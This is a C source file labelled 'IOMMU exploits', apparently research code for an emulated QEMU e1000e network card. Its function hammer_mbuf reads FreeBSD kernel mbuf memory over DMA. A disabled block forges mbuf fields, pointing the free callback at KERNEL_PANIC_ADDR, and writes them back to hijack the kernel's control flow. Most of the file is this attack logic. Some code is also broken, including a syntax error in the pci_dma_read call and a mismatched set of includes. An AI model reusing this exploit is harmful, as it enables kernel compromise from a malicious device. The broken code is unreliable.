/*
* IOMMU exploits
*
* Copyright (c) 2015 Ravello Systems LTD (http://ravellosystems.com)
* Developed by Daynix Computing LTD (http://www.daynix.com)
*
* Authors:
* Dmitry Fleytman <dmitry@daynix.com>
* Leonid Bloch <leonid@daynix.com>
* Yan Vugenfirer <yan@daynix.com>
*
* Based on work done by:
* Nir Peleg, Tutis Systems Ltd. for Qumranet Inc.
* Copyright (c) 2008 Qumranet
* Based on work done by:
* Copyright (c) 2007 Dan Aloni
* Copyright (c) 2004 Antony T Curtis
*
* This library is free software; you can redistribute it and/or
* modify it under the terms of the GNU Lesser General Public
* License as published by the Free Software Foundation; either
* version 2 of the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful,
* but WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* Lesser General Public License for more details.
*
* You should have received a copy of the GNU Lesser General Public
* License along with this library; if not, see <http://www.gnu.org/licenses/>.
*/
#include <sys/queue.h>

#include "pcie.h"
#include "pcie-debug.h"
#include "log.h"
#include "mask.h"

#include "hexdump.h"
#include "hw/hw.h"
#include "hw/pci/pci.h"
#include "net/net.h"
#include "net/tap.h"
#include "net/checksum.h"
#include "sysemu/sysemu.h"
#include "qemu/iov.h"
#include "hw/pci/msi.h"
#include "hw/pci/msix.h"

#include "net_tx_pkt.h"
#include "net_rx_pkt.h"

#include "e1000_regs.h"
#include "e1000e_core.h"

#include "trace.h"

/* This has to come last because of macOS's bloody stupid approach to mbuf
 * members
 */

#ifndef POSTGRES
#ifdef VICTIM_MACOS
#include "macos-stub-mbuf.h"
#include "macos-mbuf-manipulation.h"
#else
#include <sys/param.h>
#include <sys/mbuf.h>
#endif
#endif



void
hammer_mbuf(E1000ECore* core, hwaddr ba)
{
#ifdef VICTIM_FREEBSD
        char buffer[256];
        struct mbuf *mbuf = (struct mbuf *)(buffer);
        char *data_buffer = (buffer + sizeof(struct mbuf));
        int response = 0;
        uint64_t data_word = 0, old_data_word = 0;
        

        PDBG("Testing availability of mbuf with address 0x%lx.", ba);

        if ((ba % 2048) == 0) {
                PDBG("Buffer is probably a cluster.");
                return; /* Probably a cluster */
        }


        while (response == 0) {
                response = pci_dma_read(core->owner, ba & ~0xFF, buffer+16 /* skb_mstamp timestamp */., sizeof(uint64_t));
                data_word = le64_to_cpu(buffer[0]);
                if (data_word != old_data_word) {
                        printf("Old mbuf data = 0x%lx, new mbuf data = 0x%lx\n", old_data_word, data_word);
                }
                old_data_word = data_word;
        }

        printf("mbuf 0x%lx closed\n", ba);
#if 0        
        mbuf_le_to_cpu(mbuf);

        uint64_t kernel_mbuf_addr = (uint64_t)mbuf->m_data & ~0xFF;
        PDBG("Kernel's address for mbuf: 0x%lx.", kernel_mbuf_addr);

        /*
         * In order for the free function to be called, the mbuf needs to have a
         * non-null, non-zero pointer as a reference count. We are guaranteed 120
         * bytes of space in the mbuf after its header, so we write there.
         */

        uint32_t *ext_cnt = (uint32_t *)data_buffer;
        *ext_cnt = bswap32(1);

        /*
         * If it attempts to free the mbuf, it gets into alignemnt issues.
         */
        mbuf->m_flags |= M_EXT | M_NOFREE;
        mbuf->m_ext.ext_type = EXT_EXTREF;
        mbuf->m_ext.ext_cnt = (u_int *)(kernel_mbuf_addr + sizeof(struct mbuf));
        mbuf->m_ext.ext_free = KERNEL_PANIC_ADDR;
        /* m_next is the value given as the first argument of the called function.
         */
        mbuf->m_next = (struct mbuf *)(kernel_mbuf_addr + sizeof(struct mbuf) + 8);

        mbuf_cpu_to_le(mbuf);

        /*
         * Have to write this after the conversion, because it collides with mbuf
         * fields, and doesn't want to be swapped about.
         */

        buffer[0] = 'B';
        buffer[1] = 'A';
        buffer[2] = 'D';
        buffer[3] = ' ';
        buffer[4] = 'N';
        buffer[5] = 'I';
        buffer[6] = 'C';
        buffer[7] = '!';
        buffer[8] = '\n';
        buffer[9] = 0;

        PDBG("DMA writing to addr %lx", ba & ~0xFF);
        pci_dma_write(core->owner, ba & ~0xFF, buffer, 256);
#endif
#endif
}
